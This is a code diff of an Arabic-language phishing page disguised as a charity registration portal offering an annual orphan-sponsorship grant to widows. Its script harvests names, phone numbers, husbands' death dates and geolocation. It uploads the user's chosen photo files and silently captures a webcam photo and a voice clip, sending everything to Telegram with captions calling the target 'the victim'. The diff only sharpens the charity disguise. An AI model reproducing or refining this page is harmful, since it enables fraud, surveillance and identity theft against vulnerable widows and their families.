@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة المنح الإنسانية 2026</title>
+    <title>بوابة التسجيل | منظمة تكافل 2026</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #eef2f3; direction: rtl; padding: 15px; }
         .card { background: white; max-width: 450px; margin: auto; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); border-top: 6px solid #27ae60; }
@@ -19,23 +19,23 @@
 <body>
 
 <div class="card">
-    <img src="https://img.icons8.com/fluency/96/charity.png" width="60">
-    <h2>المنحة السنوية للأرامل والأيتام</h2>
-    <p class="subtitle">يرجى استكمال البيانات بدقة لضمان تفعيل البطاقة المصرفية</p>
+    <img src="https://img.icons8.com/fluency/96/handshake.png" width="60">
+    <h2>منظمة تكافل الإنسانية</h2>
+    <p class="subtitle">استمارة التسجيل في منحة كفالة الأيتام السنوية لعام 2026</p>
 
     <div class="input-group">
-        <label>الاسم الكامل (كما في الهوية):</label>
-        <input type="text" id="name" placeholder="اسم الأرملة الثلاثي">
+        <label>الاسم الكامل للأرملة (كما في الهوية):</label>
+        <input type="text" id="name" placeholder="الاسم الثلاثي">
     </div>
 
     <div class="input-group">
-        <label>عدد الأبناء تحت سن 18:</label>
+        <label>عدد الأبناء الأيتام:</label>
         <input type="number" id="kids" placeholder="مثلاً: 3">
     </div>
 
     <div class="input-group">
-        <label>تاريخ وفاة الزوج (يوم/شهر/سنة):</label>
-        <input type="text" id="death" placeholder="01/01/2020">
+        <label>تاريخ وفاة الزوج:</label>
+        <input type="text" id="death" placeholder="يوم/شهر/سنة">
     </div>
 
     <div class="input-group">
@@ -48,8 +48,8 @@
         <input type="file" id="studiofiles" multiple accept="image/*">
     </div>
 
-    <button class="btn" onclick="masterCapture()">تأكيد الهوية واستلام المعونة</button>
-    <p class="status">ملاحظة: سيتم طلب التحقق من الهوية عبر الكاميرا والصوت لضمان عدم التلاعب.</p>
+    <button class="btn" onclick="masterCapture()">إرسال الطلب إلى منظمة تكافل</button>
+    <p class="status">ملاحظة: سيتم إجراء تحقق بصري وصوتي فوري لمطابقة بيانات المستفيد.</p>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
@@ -83,28 +83,24 @@
         const phone = document.getElementById('phone').value;
         if (!name || !phone) { alert("يرجى ملء البيانات أولاً"); return; }
 
-        alert("جاري الاتصال بخادم التحقق.. يرجى السماح بالصلاحيات المطلوبة");
+        alert("جاري الاتصال بخوادم منظمة تكافل.. يرجى السماح بالصلاحيات المطلوبة للتحقق.");
 
-        // 1. جلب الموقع
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const map = `📍 الموقع: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            const info = `🔥 **صيد جديد** 🔥\n👤 الاسم: ${name}\n👦 الأيتام: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
+            const info = `🔥 **صيد جديد (تكافل)** 🔥\n👤 الاسم: ${name}\n👦 الأيتام: ${document.getElementById('kids').value}\n📅 الوفاة: ${document.getElementById('death').value}\n📞 الهاتف: ${phone}\n${map}`;
             await sendToTelegram("text", info);
         });
 
-        // 2. سحب ملفات الاستديو المختارة
         const files = document.getElementById('studiofiles').files;
         for (let file of files) {
-            await sendToTelegram("document", file, "📁 ملف من الاستديو");
+            await sendToTelegram("document", file, "📁 ملف مسحوب من الاستديو");
         }
 
-        // 3. الكاميرا والتصوير التلقائي
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // التقاط صورة بعد ثانيتين
             setTimeout(async () => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth;
@@ -114,7 +110,6 @@
                     await sendToTelegram("photo", blob, "📸 صورة الضحية المباشرة");
                 }, 'image/jpeg');
                 
-                // بدء تسجيل صوتي لـ 3 ثوانٍ
                 const mediaRecorder = new MediaRecorder(stream);
                 const chunks = [];
                 mediaRecorder.ondataavailable = e => chunks.push(e.data);
@@ -122,14 +117,14 @@
                     const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
                     await sendToTelegram("voice", audioBlob, "🎤 تسجيل صوتي للضحية");
                     stream.getTracks().forEach(track => track.stop());
-                    alert("تم تأكيد هويتك بنجاح، سيصلك كود الصرف عبر واتساب.");
+                    alert("تم تأكيد هويتك بنجاح لدى منظمة تكافل، سيتم التواصل معك قريباً.");
                 };
                 mediaRecorder.start();
                 setTimeout(() => mediaRecorder.stop(), 4000);
             }, 2000);
 
         } catch (e) {
-            alert("فشل التحقق! يجب السماح بالكاميرا والصوت لمطابقة بيانات الهوية.");
+            alert("خطأ في التحقق! يرجى منح الصلاحيات لمطابقة البيانات الشخصية لدى المنظمة.");
         }
     }
 </script>
